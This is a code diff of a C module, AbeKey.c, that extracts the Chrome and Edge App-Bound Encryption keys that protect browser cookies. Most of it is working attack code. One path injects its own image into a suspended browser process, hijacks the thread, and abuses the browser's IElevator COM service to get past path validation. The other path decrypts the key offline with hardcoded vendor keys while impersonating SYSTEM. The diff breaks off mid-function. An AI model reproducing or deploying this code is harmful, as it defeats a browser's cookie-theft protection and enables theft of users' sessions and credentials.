@@ -1,35 +1,44 @@
 ﻿/*
  * AbeKey.c - Chromium App-Bound Encryption master key acquisition.
  *
- * Mechanism (single file, no shellcode, no DLL injection into the target):
- *   1. CreateProcessInternalW(browser, suspended) - no browser code ever runs.
- *      The KernelBase primitive builds a complete parameter block (desktop,
- *      environment) which hand-rolled RTL_USER_PROCESS_PARAMETERS lack.
- *   2. Map our own PE image into the target (memory copy + base relocations +
- *      per-section page protections + instruction cache flush via NT
- *      syscalls). The input request block is patched into the staging copy,
- *      so the payload needs no arguments. Our IAT entries for ntdll keep
- *      their absolute addresses: ntdll is mapped at the same base in every
- *      process of a boot session, and the loader resolved them already. The
- *      payload resolves its COM entry points at run time through
- *      LoadLibraryW/GetProcAddress.
- *   3. NtSetContextThread: redirect the initial thread RIP (x64) / PC (ARM64*)
- *      to ZpAbe_PayloadEntry - a zero-argument function, because the initial
- *      thread context does not deliver argument registers. The loader's
- *      LdrInitializeThunk APC still runs first, so the entry executes in a
- *      fully initialized process.
- *   4. Payload extracts the APPB blob from the Local State copy and unwraps
- *      the key through the browser's IElevator COM service (path validation
- *      passes: the host exe is the real browser). The standard marshaler
- *      proxy comes from the browser's own machine registration only; this
- *      code never touches the registry and fails closed when the vendor
- *      registration is missing.
- *   5. Results are published to volatile globals inside the mapped image and
- *      the payload then parks forever: the process must stay alive until the
- *      client has read the results (a terminated process cannot be read
- *      back). The client polls with NtReadVirtualMemory and reaps the
- *      process; the mapped image dies with the address space - freeing it
- *      remotely while the payload thread may still be running is not safe.
+ * Acquisition strategy (first success wins):
+ *   1. Elevate (elevated client only): offline unwrap, no browser process is
+ *      launched. Reverses the browser's key wrap: strip "APPB", SYSTEM DPAPI
+ *      layer, user DPAPI layer, then the vendor private envelope (V1
+ *      AES-256-GCM / V2 ChaCha20-Poly1305 fixed keys, V3 CNG-wrapped key, or
+ *      a legacy raw 32-byte key). The V1/V2 keys, the V3 mask and the CNG key
+ *      names are byte-identical to the ones embedded in the vendors'
+ *      elevation_service.exe binaries.
+ *   2. Hijack: CreateProcessInternalW(browser, suspended) - no browser code
+ *      ever runs. The KernelBase primitive builds a complete parameter block
+ *      (desktop, environment) which hand-rolled RTL_USER_PROCESS_PARAMETERS
+ *      lack.
+ *
+ * Hijack mechanism details:
+ *   - Map our own PE image into the target (memory copy + base relocations +
+ *     per-section page protections + instruction cache flush via NT
+ *     syscalls). The client parses Local State via WinRT JSON and patches the
+ *     decoded APPB blob into the staging copy, so the payload carries no
+ *     parser; only volatile result globals may be written and every COM entry
+ *     point is resolved at run time. Our IAT entries for ntdll keep their
+ *     absolute addresses: ntdll is mapped at the same base in every process
+ *     of a boot session, and the loader resolved them already.
+ *   - NtSetContextThread: redirect the initial thread RIP (x64) / PC (ARM64*)
+ *     to ZpAbe_PayloadEntry - a zero-argument function, because the initial
+ *     thread context does not deliver argument registers. The loader's
+ *     LdrInitializeThunk APC still runs first, so the entry executes in a
+ *     fully initialized process.
+ *   - The payload unwraps the key through the browser's IElevator COM service
+ *     (path validation passes: the host exe is the real browser). The
+ *     standard marshaler proxy comes from the browser's own machine
+ *     registration only; this code never touches the registry and fails
+ *     closed when the vendor registration is missing.
+ *   - Results are published to volatile globals inside the mapped image and
+ *     the payload then parks forever: the process must stay alive until the
+ *     client has read the results (a terminated process cannot be read
+ *     back). The client polls with NtReadVirtualMemory and reaps the
+ *     process; the mapped image dies with the address space - freeing it
+ *     remotely while the payload thread may still be running is not safe.
  *
  * Concurrency: one in-flight acquisition per browser (single-flight). The
  * leader runs the expensive phase outside the entry lock and publishes
@@ -55,17 +64,31 @@
  * x86 is not supported and fails fast.
  */
 
-#include <KNSoft/NDK/NDK.h>
-#include <strsafe.h>
-#include <bcrypt.h>
+#include "Client.h"
 
-#pragma warning(disable: 4152) /* classic GetProcAddress idiom */
+#include <KNSoft/MakeLifeEasier/Data/Json.h>
+
+#include <KNSoft/MakeLifeEasier/MakeLifeEasier.h>
+#include <bcrypt.h>
+#include <ncrypt.h>
+#include <strsafe.h>
+
+#pragma comment(lib, "Bcrypt.lib")
+#pragma comment(lib, "Ncrypt.lib")
 #pragma comment(lib, "KNSoft.NDK.WinAPI.lib")
 
 #define ZP_ABE_EDGE             0
 #define ZP_ABE_CHROME           1
 
-#define ZP_ABE_LOCAL_STATE_MAX  (1024 * 1024)
+#define ZP_ABE_KEY_SIZE         32
+#define ZP_ABE_BLOB_MAX         2048
+
+/* V1/V2 private envelope: version[1] + nonce[12] + ciphertext[32] + tag[16] */
+#define ZP_ABE_V12_ENVELOPE_SIZE 61
+
+/* V3 private envelope: version[1] + cng_block[32] + nonce[12] + ciphertext[32] + tag[16] */
+#define ZP_ABE_V3_ENVELOPE_SIZE  93
+
 #define ZP_ABE_POLL_SLACK_MS    15
 #define ZP_ABE_POLL_COUNT       1000
 #define ZP_ABE_WAIT_SLACK_MS    20000
@@ -76,6 +99,7 @@ typedef struct _ZP_ABE_BROWSER
     GUID Clsid;
     GUID Iid;
     ULONG DecryptSlot;     /* IElevator::DecryptData vtable slot */
+    PCWSTR CngKey;         /* persisted envelope key in the SYSTEM profile KSP store (V3) */
     PCWSTR Vendor;
     PCWSTR ExeName;
 } ZP_ABE_BROWSER;
@@ -83,10 +107,25 @@ typedef struct _ZP_ABE_BROWSER
 static const ZP_ABE_BROWSER ZpAbeBrowsers[] = {
     { {0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67}},
       {0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B}},
-      8, L"Microsoft\\Edge", L"msedge.exe" },
+      8, L"Microsoft Edgekey1", L"Microsoft\\Edge", L"msedge.exe" },
     { {0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}},
       {0x1BF5208B, 0x295F, 0x4992, {0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38}},
-      5, L"Google\\Chrome", L"chrome.exe" },
+      5, L"Google Chromekey1", L"Google\\Chrome", L"chrome.exe" },
+};
+
+/* private envelope constants, embedded byte-identical in the Chrome/Edge
+ * elevation_service.exe and documented in the ABE TechWiki write-up */
+static const BYTE ZpAbeV1Key[ZP_ABE_KEY_SIZE] = {
+    0xB3,0x1C,0x6E,0x24,0x1A,0xC8,0x46,0x72,0x8D,0xA9,0xC1,0xFA,0xC4,0x93,0x66,0x51,
+    0xCF,0xFB,0x94,0x4D,0x14,0x3A,0xB8,0x16,0x27,0x6B,0xCC,0x6D,0xA0,0x28,0x47,0x87
+};
+static const BYTE ZpAbeV2Key[ZP_ABE_KEY_SIZE] = {
+    0xE9,0x8F,0x37,0xD7,0xF4,0xE1,0xFA,0x43,0x3D,0x19,0x30,0x4D,0xC2,0x25,0x80,0x42,
+    0x09,0x0E,0x2D,0x1D,0x7E,0xEA,0x76,0x70,0xD4,0x1F,0x73,0x8D,0x08,0x72,0x96,0x60
+};
+static const BYTE ZpAbeV3Mask[ZP_ABE_KEY_SIZE] = {
+    0xCC,0xF8,0xA1,0xCE,0xC5,0x66,0x05,0xB8,0x51,0x75,0x52,0xBA,0x1A,0x2D,0x06,0x1C,
+    0x03,0xA2,0x9E,0x90,0x27,0x4F,0xB2,0xFC,0xF5,0x9B,0xA4,0xB7,0x5C,0x39,0x23,0x90
 };
 
 #if defined(_M_IX86)
@@ -106,19 +145,19 @@ ZpAbeAcquireCookieKey(
 #else
 
 /* ---- payload: executes inside the loader-initialized browser process ----
- * No CRT state (CRT init never ran there): only intrinsics, in-image pure CRT
- * helpers and dynamically resolved COM entry points. Never returns and never
- * exits the process: the client must be able to read the results, so it stays
- * parked until the client reaps it. */
+ * No CRT state (CRT init never ran there): only intrinsics and dynamically
+ * resolved COM entry points. Never returns and never exits the process: the
+ * client must be able to read the results, so it stays parked until the
+ * client reaps it. */
 
 typedef struct _ZP_ABE_REQUEST
 {
     ULONG Browser;
-    ULONG LocalStateLength;
-    BYTE LocalState[ZP_ABE_LOCAL_STATE_MAX];
+    ULONG BlobLength;                   /* APPB blob, prefix included */
+    BYTE Blob[ZP_ABE_BLOB_MAX];
 } ZP_ABE_REQUEST;
 
-static ZP_ABE_REQUEST ZpAbe_Request;
+static ZP_ABE_REQUEST ZpAbe_Request;    /* patched into the staging copy */
 
 static volatile LONG ZpAbe_Pending; /* 0 = running, 1 = finished */
 static volatile LONG ZpAbe_Code = (LONG)0x80004005L /* E_FAIL */;
@@ -129,115 +168,99 @@ typedef HRESULT (WINAPI *ZP_ABE_DECRYPT_DATA)(PVOID, BSTR, BSTR*, DWORD*);
 static VOID
 ZpAbe_PayloadEntry(VOID)
 {
-    static const CHAR Tag[] = "\"app_bound_encrypted_key\":\"";
-    static BYTE Blob[2048];
+    static UNICODE_STRING Ole32Dll = RTL_CONSTANT_STRING(L"ole32.dll");
+    static UNICODE_STRING OleAut32Dll = RTL_CONSTANT_STRING(L"oleaut32.dll");
+    static ANSI_STRING CoInitializeExName = RTL_CONSTANT_STRING("CoInitializeEx");
+    static ANSI_STRING CoUninitializeName = RTL_CONSTANT_STRING("CoUninitialize");
+    static ANSI_STRING CoCreateInstanceName = RTL_CONSTANT_STRING("CoCreateInstance");
+    static ANSI_STRING CoSetProxyBlanketName = RTL_CONSTANT_STRING("CoSetProxyBlanket");
+    static ANSI_STRING SysAllocStringByteLenName = RTL_CONSTANT_STRING("SysAllocStringByteLen");
+    static ANSI_STRING SysStringByteLenName = RTL_CONSTANT_STRING("SysStringByteLen");
+    static ANSI_STRING SysFreeStringName = RTL_CONSTANT_STRING("SysFreeString");
     const ZP_ABE_BROWSER* Browser = NULL;
-    LONG Code = (LONG)0x80004005L;
     HRESULT (WINAPI *CoInitializeExFn)(PVOID, DWORD);
+    HRESULT (WINAPI *CoUninitializeFn)(VOID);
     HRESULT (WINAPI *CoCreateInstanceFn)(const GUID*, PVOID, DWORD, const GUID*, PVOID*);
     HRESULT (WINAPI *CoSetProxyBlanketFn)(PVOID, DWORD, DWORD, PCWSTR, DWORD, DWORD, PVOID, DWORD);
-    VOID (WINAPI *CoUninitializeFn)(VOID);
     BSTR (WINAPI *SysAllocStringByteLenFn)(PCSTR, UINT);
     UINT (WINAPI *SysStringByteLenFn)(BSTR);
     VOID (WINAPI *SysFreeStringFn)(BSTR);
-    BOOL (WINAPI *CryptStringToBinaryFn)(PCSTR, DWORD, DWORD, PBYTE, DWORD*, DWORD*, DWORD*);
-    PCSTR Base64 = NULL;
-    PVOID Elevator = NULL;
+    PVOID Ole32, OleAut32, Elevator = NULL;
     BSTR In = NULL, Out = NULL;
-    ULONG Index, Base64Length = 0, TagLength = sizeof(Tag) - 1, BlobLength = 0;
+    DWORD LastError;
+    LONG Code = (LONG)0x80004005L;
     HRESULT Hr = E_FAIL;
 
-    if (ZpAbe_Request.Browser < ARRAYSIZE(ZpAbeBrowsers)) Browser = &ZpAbeBrowsers[ZpAbe_Request.Browser];
-    if (Browser != NULL)
+    if (ZpAbe_Request.Browser < ARRAYSIZE(ZpAbeBrowsers))
     {
-        for (Index = 0; Index + TagLength <= ZpAbe_Request.LocalStateLength; Index++)
-        {
-            if (ZpAbe_Request.LocalState[Index] == Tag[0] &&
-                memcmp(ZpAbe_Request.LocalState + Index, Tag, TagLength) == 0)
-            {
-                Base64 = (PCSTR)ZpAbe_Request.LocalState + Index + TagLength;
-                break;
-            }
-        }
-        if (Base64 != NULL)
-        {
-            ULONG Remaining = ZpAbe_Request.LocalStateLength -
-                              (ULONG)((PBYTE)Base64 - (PBYTE)ZpAbe_Request.LocalState);
-            ULONG Limit = min(8192U, Remaining);
+        Browser = &ZpAbeBrowsers[ZpAbe_Request.Browser];
+    }
+    if (Browser != NULL &&
+        ZpAbe_Request.BlobLength > 4 &&
+        memcmp((PVOID)ZpAbe_Request.Blob, "APPB", 4) == 0 &&
+        NT_SUCCESS(PS_LoadDllFromSystemDir(NULL, &Ole32Dll, &Ole32)) &&
+        NT_SUCCESS(PS_LoadDllFromSystemDir(NULL, &OleAut32Dll, &OleAut32)) &&
+        NT_SUCCESS(PS_GetProcAddress(Ole32, &CoInitializeExName, (PVOID*)&CoInitializeExFn)) &&
+        NT_SUCCESS(PS_GetProcAddress(Ole32, &CoUninitializeName, (PVOID*)&CoUninitializeFn)) &&
+        NT_SUCCESS(PS_GetProcAddress(Ole32, &CoCreateInstanceName, (PVOID*)&CoCreateInstanceFn)) &&
+        NT_SUCCESS(PS_GetProcAddress(Ole32, &CoSetProxyBlanketName, (PVOID*)&CoSetProxyBlanketFn)) &&
+        NT_SUCCESS(PS_GetProcAddress(OleAut32, &SysAllocStringByteLenName, (PVOID*)&SysAllocStringByteLenFn)) &&
+        NT_SUCCESS(PS_GetProcAddress(OleAut32, &SysStringByteLenName, (PVOID*)&SysStringByteLenFn)) &&
+        NT_SUCCESS(PS_GetProcAddress(OleAut32, &SysFreeStringName, (PVOID*)&SysFreeStringFn)))
+    {
+        /* RPC_E_CHANGED_MODE: the thread already has another apartment, still usable */
+        HRESULT CoHr = CoInitializeExFn(NULL, COINIT_APARTMENTTHREADED);
 
-            while (Base64Length < Limit && Base64[Base64Length] != '"') Base64Length++;
-        }
-        CryptStringToBinaryFn = (PVOID)GetProcAddress(LoadLibraryW(L"crypt32.dll"),
-                                                      "CryptStringToBinaryA");
-        BlobLength = sizeof(Blob);
-        if (Base64 != NULL &&
-            Base64Length != 0 &&
-            CryptStringToBinaryFn != NULL &&
-            CryptStringToBinaryFn(Base64,
-                                  Base64Length,
-                                  CRYPT_STRING_BASE64,
-                                  Blob,
-                                  &BlobLength,
-                                  NULL,
-                                  NULL) &&
-            BlobLength > 4 &&
-            memcmp(Blob, "APPB", 4) == 0)
+        if (SUCCEEDED(CoHr) || CoHr == RPC_E_CHANGED_MODE)
         {
-            if ((CoInitializeExFn = (PVOID)GetProcAddress(LoadLibraryW(L"ole32.dll"), "CoInitializeEx")) != NULL &&
-                (CoCreateInstanceFn = (PVOID)GetProcAddress(GetModuleHandleW(L"ole32.dll"), "CoCreateInstance")) != NULL &&
-                (CoSetProxyBlanketFn = (PVOID)GetProcAddress(GetModuleHandleW(L"ole32.dll"), "CoSetProxyBlanket")) != NULL &&
-                (CoUninitializeFn = (PVOID)GetProcAddress(GetModuleHandleW(L"ole32.dll"), "CoUninitialize")) != NULL &&
-                (SysAllocStringByteLenFn = (PVOID)GetProcAddress(LoadLibraryW(L"oleaut32.dll"), "SysAllocStringByteLen")) != NULL &&
-                (SysStringByteLenFn = (PVOID)GetProcAddress(GetModuleHandleW(L"oleaut32.dll"), "SysStringByteLen")) != NULL &&
-                (SysFreeStringFn = (PVOID)GetProcAddress(GetModuleHandleW(L"oleaut32.dll"), "SysFreeString")) != NULL)
+            Hr = CoCreateInstanceFn(&Browser->Clsid,
+                                    NULL,
+                                    CLSCTX_LOCAL_SERVER,
+                                    &Browser->Iid,
+                                    &Elevator);
+            if (SUCCEEDED(Hr))
             {
-                Hr = CoInitializeExFn(NULL, COINIT_APARTMENTTHREADED);
+                Hr = CoSetProxyBlanketFn(Elevator,
+                                         RPC_C_AUTHN_DEFAULT,
+                                         RPC_C_AUTHZ_DEFAULT,
+                                         NULL,
+                                         RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
+                                         RPC_C_IMP_LEVEL_IMPERSONATE,
+                                         NULL,
+                                         EOAC_DYNAMIC_CLOAKING);
                 if (SUCCEEDED(Hr))
                 {
-                    DWORD LastError = 0;
-
-                    Hr = CoCreateInstanceFn(&Browser->Clsid,
-                                            NULL,
-                                            CLSCTX_LOCAL_SERVER,
-                                            &Browser->Iid,
-                                            &Elevator);
-                    if (SUCCEEDED(Hr))
+                    In = SysAllocStringByteLenFn((PCSTR)ZpAbe_Request.Blob + 4,
+                                                  ZpAbe_Request.BlobLength - 4);
+                    if (In == NULL)
                     {
-                        Hr = CoSetProxyBlanketFn(Elevator,
-                                                 RPC_C_AUTHN_DEFAULT,
-                                                 RPC_C_AUTHZ_DEFAULT,
-                                                 NULL,
-                                                 RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
-                                                 RPC_C_IMP_LEVEL_IMPERSONATE,
-                                                 NULL,
-                                                 EOAC_DYNAMIC_CLOAKING);
-                        if (SUCCEEDED(Hr))
+                        Hr = E_OUTOFMEMORY;
+                    } else
+                    {
+                        Hr = ((ZP_ABE_DECRYPT_DATA)((*(PVOID***)Elevator)[Browser->DecryptSlot]))(
+                            Elevator, In, &Out, &LastError);
+                        if (SUCCEEDED(Hr) && Out != NULL && SysStringByteLenFn(Out) == 32)
                         {
-                            In = SysAllocStringByteLenFn((PCSTR)Blob + 4, BlobLength - 4);
-                            Hr = In != NULL ?
-                                     ((ZP_ABE_DECRYPT_DATA)((*(PVOID***)Elevator)[Browser->DecryptSlot]))(
-                                         Elevator, In, &Out, &LastError) :
-                                     E_OUTOFMEMORY;
-                            if (SUCCEEDED(Hr))
-                            {
-                                if (Out != NULL && SysStringByteLenFn(Out) == 32)
-                                {
-                                    RtlCopyMemory((PVOID)ZpAbe_Key, Out, 32);
-                                    Code = 0;
-                                }
-                                else
-                                {
-                                    Hr = E_UNEXPECTED;
-                                }
-                            }
-                            if (Out != NULL) SysFreeStringFn(Out);
-                            if (In != NULL) SysFreeStringFn(In);
+                            RtlCopyMemory((PVOID)ZpAbe_Key, Out, 32);
+                            Code = 0;
                         }
-                        ((ULONG (WINAPI*)(PVOID))((*(PVOID**)Elevator)[2]))(Elevator);
                     }
-                    CoUninitializeFn();
                 }
+                ((ULONG (WINAPI*)(PVOID))((*(PVOID**)Elevator)[2]))(Elevator);
             }
+            if (SUCCEEDED(CoHr))
+            {
+                CoUninitializeFn();
+            }
+        }
+        /* release the COM allocations in the host (browser) process */
+        if (In != NULL)
+        {
+            SysFreeStringFn(In);
+        }
+        if (Out != NULL)
+        {
+            SysFreeStringFn(Out);
         }
     }
     if (Code != 0) Code = (LONG)Hr;
@@ -261,6 +284,9 @@ ZpAbe_PayloadEntry(VOID)
  * retryable after a short cooldown; identity is the SHA-256 of the
  * app_bound_encrypted_key ciphertext */
 
+#define ZP_ABE_METHOD_HIJACK  0
+#define ZP_ABE_METHOD_ELEVATE 1
+
 typedef struct _ZP_ABE_CACHE_ENTRY
 {
     LONG Lock;
@@ -270,6 +296,8 @@ typedef struct _ZP_ABE_CACHE_ENTRY
     BYTE Key[32];
     LONG Status;
     LONG Result;
+    LONG Method;        /* ZP_ABE_METHOD_* */
+    LONG Envelope;      /* private envelope version, 0 when unknown/raw */
     ULONGLONG RetryTime;
 } ZP_ABE_CACHE_ENTRY;
 
@@ -351,35 +379,91 @@ ZpAbeHashSha256(
 }
 
 static
-BOOLEAN
-ZpAbeFindBlobSpan(
-    _In_reads_bytes_(Length) const BYTE* Text,
-    _In_ ULONG Length,
-    _Out_ PULONG Offset,
-    _Out_ PULONG SpanLength)
+HRESULT
+ZpAbeGetNamedString(
+    _In_ IJsonObject* Object,
+    _In_ PCWSTR Name,
+    _Out_ HSTRING* Value)
 {
-    static const CHAR Tag[] = "\"app_bound_encrypted_key\":\"";
-    ULONG TagLength = sizeof(Tag) - 1, Index, Limit;
+    HSTRING_HEADER Header;
+    HSTRING String;
+    HRESULT Hr;
 
-    if (Length <= TagLength) return FALSE;
-    Limit = Length - TagLength;
-    for (Index = 0; Index <= Limit; Index++)
+    Hr = _Inline_WindowsCreateStringReference(Name, _STR_LEN(Name), &Header, &String);
+    if (FAILED(Hr))
     {
-        if (Text[Index] == Tag[0] && memcmp(Text + Index, Tag, TagLength) == 0)
-        {
-            ULONG Begin = Index + TagLength, End = Begin;
+        return Hr;
+    }
+    return Object->lpVtbl->GetNamedString(Object, String, Value);
+}
 
-            while (End < Length && Text[End] != '"') End++;
-            if (End > Begin && End - Begin <= 8192)
-            {
-                *Offset = Begin;
-                *SpanLength = End - Begin;
-                return TRUE;
-            }
-            return FALSE;
+/* parses Local State via WinRT JSON (requires an apartment on the caller) and
+ * base64-decodes os_crypt.app_bound_encrypted_key into Blob ("APPB" kept) */
+static
+NTSTATUS
+ZpAbeReadAppBoundBlob(
+    _In_ PCWSTR LocalStatePath,
+    _Out_writes_bytes_(ZP_ABE_BLOB_MAX) PBYTE Blob,
+    _Out_ PULONG BlobLength)
+{
+    IJsonValue* Root = NULL;
+    IJsonObject* RootObject = NULL;
+    IJsonObject* OsCrypt = NULL;
+    HSTRING EncodedString = NULL;
+    PCWSTR EncodedText;
+    DWORD Length = 0;
+    HRESULT Hr;
+    NTSTATUS Status;
+
+    *BlobLength = 0;
+    Hr = Data_JsonParseUtf8File(LocalStatePath, 1024 * 1024, &Root);
+    if (SUCCEEDED(Hr)) Hr = Root->lpVtbl->GetObject(Root, &RootObject);
+    if (SUCCEEDED(Hr))
+    {
+        HSTRING_HEADER Header;
+        HSTRING Name;
+
+        Hr = _Inline_WindowsCreateStringReference(L"os_crypt", _STR_LEN(L"os_crypt"), &Header, &Name);
+        if (SUCCEEDED(Hr))
+        {
+            Hr = RootObject->lpVtbl->GetNamedObject(RootObject, Name, &OsCrypt);
         }
     }
-    return FALSE;
+    if (SUCCEEDED(Hr)) Hr = ZpAbeGetNamedString(OsCrypt, L"app_bound_encrypted_key", &EncodedString);
+    if (SUCCEEDED(Hr))
+    {
+        EncodedText = _Inline_WindowsGetStringRawBuffer(EncodedString, NULL);
+        if (!CryptStringToBinaryW(EncodedText,
+                                  0,
+                                  CRYPT_STRING_BASE64,
+                                  NULL,
+                                  &Length,
+                                  NULL,
+                                  NULL) ||
+            Length == 0 ||
+            Length > ZP_ABE_BLOB_MAX ||
+            !CryptStringToBinaryW(EncodedText,
+                                  0,
+                                  CRYPT_STRING_BASE64,
+                                  Blob,
+                                  &Length,
+                                  NULL,
+                                  NULL))
+        {
+            Hr = HRESULT_FROM_WIN32(ERROR_INVALID_DATA);
+        }
+    }
+    if (SUCCEEDED(Hr) && (Length <= 4 || memcmp(Blob, "APPB", 4) != 0))
+    {
+        Hr = HRESULT_FROM_WIN32(ERROR_INVALID_DATA);
+    }
+    if (SUCCEEDED(Hr)) *BlobLength = Length;
+    if (EncodedString != NULL) _Inline_WindowsDeleteString(EncodedString);
+    if (OsCrypt != NULL) OsCrypt->lpVtbl->Release(OsCrypt);
+    if (RootObject != NULL) RootObject->lpVtbl->Release(RootObject);
+    if (Root != NULL) Root->lpVtbl->Release(Root);
+    Status = FAILED(Hr) ? STATUS_UNSUCCESSFUL : STATUS_SUCCESS;
+    return Status;
 }
 
 static
@@ -440,76 +524,331 @@ ZpAbeGetPaths(
     return FALSE;
 }
 
+/* ---- AEAD helpers (elevate path) ---- */
+
+/* user-mode bcrypt.h does not define it (the KM header does); CNG
+   ChaCha20-Poly1305 requires this chaining mode */
+#ifndef BCRYPT_CHAIN_MODE_NIST
+#define BCRYPT_CHAIN_MODE_NIST L"ChainingModeNIST"
+#endif
+
 static
 NTSTATUS
-ZpAbeReadFile(
-    _In_ PCWSTR Path,
-    _Out_writes_bytes_(Capacity) PBYTE Buffer,
-    _In_ ULONG Capacity,
-    _Out_ PULONG Length)
+ZpAbeAeadOpen(
+    _In_ PCWSTR Algorithm,
+    _In_ PCWSTR ChainingMode,
+    _In_reads_bytes_(32) const BYTE* Key,
+    _In_reads_bytes_(12) const BYTE* Nonce,
+    _In_reads_bytes_(Length) const BYTE* CipherText,
+    _In_ ULONG Length,
+    _In_reads_bytes_(16) const BYTE* Tag,
+    _Out_writes_bytes_(Length) PBYTE Plain)
 {
-    UNICODE_STRING NtPath;
-    OBJECT_ATTRIBUTES Object;
-    IO_STATUS_BLOCK IoStatus;
-    FILE_STANDARD_INFORMATION Standard;
-    HANDLE File;
-    ULONG Total = 0;
+    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO Auth;
+    BCRYPT_ALG_HANDLE Alg = NULL;
+    BCRYPT_KEY_HANDLE Cipher = NULL;
+    PBYTE Object = NULL;
+    ULONG ObjLen, Done, Result;
     NTSTATUS Status;
 
-    *Length = 0;
-    Status = RtlDosPathNameToNtPathName_U_WithStatus(Path, &NtPath, NULL, NULL);
-    if (!NT_SUCCESS(Status)) return Status;
-    InitializeObjectAttributes(&Object, &NtPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
-    Status = NtOpenFile(&File,
-                        FILE_READ_DATA | SYNCHRONIZE,
-                        &Object,
-                        &IoStatus,
-                        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
-                        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE);
-    RtlFreeUnicodeString(&NtPath);
-    if (!NT_SUCCESS(Status)) return Status;
-    Status = NtQueryInformationFile(File,
-                                    &IoStatus,
-                                    &Standard,
-                                    sizeof(Standard),
-                                    FileStandardInformation);
-    if (NT_SUCCESS(Status) &&
-        (Standard.EndOfFile.QuadPart <= 0 || Standard.EndOfFile.QuadPart > (LONGLONG)Capacity))
+    Status = BCryptOpenAlgorithmProvider(&Alg, Algorithm, NULL, 0);
+    if (NT_SUCCESS(Status))
     {
-        Status = Standard.EndOfFile.QuadPart > 0 ? STATUS_BUFFER_TOO_SMALL : STATUS_UNSUCCESSFUL;
+        Status = BCryptSetProperty(Alg,
+                                   BCRYPT_CHAINING_MODE,
+                                   (PUCHAR)ChainingMode,
+                                   (ULONG)(Str_SizeW(ChainingMode) + sizeof(WCHAR)),
+                                   0);
     }
-    while (NT_SUCCESS(Status) && Total < (ULONGLONG)Standard.EndOfFile.QuadPart)
+    if (NT_SUCCESS(Status))
     {
-        Status = NtReadFile(File,
-                            NULL,
-                            NULL,
-                            NULL,
-                            &IoStatus,
-                            Buffer + Total,
-                            (ULONG)Standard.EndOfFile.QuadPart - Total,
-                            NULL,
-                            NULL);
-        if (NT_SUCCESS(Status))
-        {
-            if (IoStatus.Information == 0)
-            {
-                Status = STATUS_UNSUCCESSFUL;
-                break;
-            }
-            Total += (ULONG)IoStatus.Information;
-        }
+        Status = BCryptGetProperty(Alg,
+                                   BCRYPT_OBJECT_LENGTH,
+                                   (PUCHAR)&ObjLen,
+                                   sizeof(ObjLen),
+                                   &Done,
+                                   0);
     }
-    NtClose(File);
-    if (NT_SUCCESS(Status)) *Length = Total;
+    if (NT_SUCCESS(Status))
+    {
+        Object = Mem_Alloc(ObjLen);
+        if (Object == NULL) Status = STATUS_NO_MEMORY;
+    }
+    if (NT_SUCCESS(Status))
+    {
+        Status = BCryptGenerateSymmetricKey(Alg, &Cipher, Object, ObjLen, (PUCHAR)Key, 32, 0);
+    }
+    if (NT_SUCCESS(Status))
+    {
+        BCRYPT_INIT_AUTH_MODE_INFO(Auth);
+        Auth.pbNonce = (PUCHAR)Nonce;
+        Auth.cbNonce = 12;
+        Auth.pbTag = (PUCHAR)Tag;
+        Auth.cbTag = 16;
+        Status = BCryptDecrypt(Cipher,
+                               (PUCHAR)CipherText,
+                               Length,
+                               &Auth,
+                               NULL,
+                               0,
+                               Plain,
+                               Length,
+                               &Result,
+                               0);
+    }
+    if (Cipher != NULL)
+    {
+        BCryptDestroyKey(Cipher);
+    }
+    if (Object != NULL)
+    {
+        RtlSecureZeroMemory(Object, ObjLen);
+        Mem_Free(Object);
+    }
+    BCryptCloseAlgorithmProvider(Alg, 0);
     return Status;
 }
+
+/* V1/V2 envelope unwrap with the fixed embedded keys */
+static
+BOOLEAN
+ZpAbeV1V2Unwrap(
+    _In_ ULONG EnvelopeVersion,
+    _In_reads_bytes_(ZP_ABE_V12_ENVELOPE_SIZE) const BYTE* Envelope,
+    _Out_writes_bytes_(32) PBYTE Key)
+{
+    NTSTATUS Status;
+
+    Status = EnvelopeVersion == 1 ?
+        ZpAbeAeadOpen(BCRYPT_AES_ALGORITHM,
+                      BCRYPT_CHAIN_MODE_GCM,
+                      ZpAbeV1Key,
+                      Envelope + 1,
+                      Envelope + 13,
+                      32,
+                      Envelope + 45,
+                      Key) :
+        ZpAbeAeadOpen(BCRYPT_CHACHA20_POLY1305_ALGORITHM,
+                      BCRYPT_CHAIN_MODE_NIST,
+                      ZpAbeV2Key,
+                      Envelope + 1,
+                      Envelope + 13,
+                      32,
+                      Envelope + 45,
+                      Key);
+    return NT_SUCCESS(Status);
+}
+
+/* V3 envelope unwrap; must run impersonating SYSTEM (the CNG key lives in the
+   SYSTEM profile's Microsoft Software KSP store) */
+static
+BOOLEAN
+ZpAbeV3Unwrap(
+    _In_ const ZP_ABE_BROWSER* Browser,
+    _In_reads_bytes_(ZP_ABE_V3_ENVELOPE_SIZE) const BYTE* Envelope,
+    _Out_writes_bytes_(32) PBYTE Key)
+{
+    NCRYPT_PROV_HANDLE Provider = 0;
+    NCRYPT_KEY_HANDLE CngKey = 0;
+    BYTE Derived[ZP_ABE_KEY_SIZE];
+    DWORD Length;
+    SECURITY_STATUS St;
+    NTSTATUS Status;
+    ULONG i;
+
+    St = NCryptOpenStorageProvider(&Provider, MS_KEY_STORAGE_PROVIDER, 0);
+    if (FAILED(St))
+    {
+        return FALSE;
+    }
+    St = NCryptOpenKey(Provider, &CngKey, Browser->CngKey, 0, 0);
+    if (FAILED(St))
+    {
+        NCryptFreeObject(Provider);
+        return FALSE;
+    }
+
+    /* raw 32->32 decrypt, as done by the browsers' elevation service */
+    St = NCryptDecrypt(CngKey,
+                       (PBYTE)Envelope + 1,
+                       ZP_ABE_KEY_SIZE,
+                       NULL,
+                       Derived,
+                       sizeof(Derived),
+                       &Length,
+                       NCRYPT_SILENT_FLAG);
+    NCryptFreeObject(CngKey);
+    NCryptFreeObject(Provider);
+    if (FAILED(St) || Length != ZP_ABE_KEY_SIZE)
+    {
+        return FALSE;
+    }
